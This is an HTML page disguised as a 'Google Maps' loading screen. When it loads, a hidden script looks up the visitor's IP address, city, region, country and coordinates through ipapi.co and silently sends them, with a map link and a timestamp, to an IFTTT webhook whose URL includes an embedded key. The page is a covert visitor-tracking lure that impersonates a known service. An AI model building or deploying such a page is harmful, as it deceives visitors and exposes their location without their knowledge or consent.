<!DOCTYPE html>
<html>
<head>
  <title>Google Maps</title>
</head>
<body>
  <h1>Loading Google Maps...</h1>

  <script>
    async function logVisitor() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("IP API failed");

        const data = await res.json();

        const ip = data.ip || "No IP";
        const city = data.city || "No city";
        const region = data.region || "No region";
        const country = data.country_name || "No country";
        const lat = data.latitude || "0";
        const lon = data.longitude || "0";
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const timestamp = new Date().toLocaleString();

        const fullLocation = `${ip} â€” ${city}, ${region}, ${country}`;

        // Send to IFTTT only if IP is valid
        if (ip !== "No IP") {
          await fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              value1: fullLocation,
              value2: mapsLink,
              value3: timestamp
            })
          });
        } else {
          console.error("IP was not received");
        }
      } catch (err) {
        console.error("Logging error:", err);
      }
    }

    logVisitor();
  </script>
</body>
</html>
